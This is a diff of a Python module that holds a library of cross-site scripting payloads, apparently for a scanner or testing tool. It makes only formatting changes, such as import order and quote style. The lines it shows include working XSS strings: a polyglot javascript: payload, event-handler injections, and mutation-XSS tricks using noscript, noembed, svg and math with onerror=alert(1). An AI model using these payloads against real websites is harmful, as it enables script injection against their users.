@@ -2,9 +2,9 @@
 XSS payload library — P2 upgrade: 100+ payloads.
 """
 
-from typing import List
 import secrets
 import string
+from typing import List
 
 REFLECTED_PAYLOADS: List[str] = [
     # Basic script tags
@@ -106,7 +106,7 @@ REFLECTED_PAYLOADS: List[str] = [
     # CSS injection
     "background-image:url(javascript:alert(1))",
     # Polyglots
-    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",  # noqa: E501
+    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
     # On-window
     "onwheel=alert(1)",
     "onscroll=alert(1)",
@@ -172,9 +172,9 @@ MXSS_PAYLOADS: List[str] = [
     # Namespace mutation: <svg><style></style>
     "<svg><style></style><img src=x onerror=alert(1)>",
     # <noscript> mutation: contents become innerHTML in noscript-disabled browser
-    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
     # <noembed> mutation (legacy IE/FF)
-    "<noembed><p title=\"</noembed><img src=x onerror=alert(1)>\">",
+    '<noembed><p title="</noembed><img src=x onerror=alert(1)>">',
     # <math>x<style> mutation
     "<math><style><!--</style><img src=x onerror=alert(1)>-->",
     # <template> mutation (shadow DOM re-parsing)
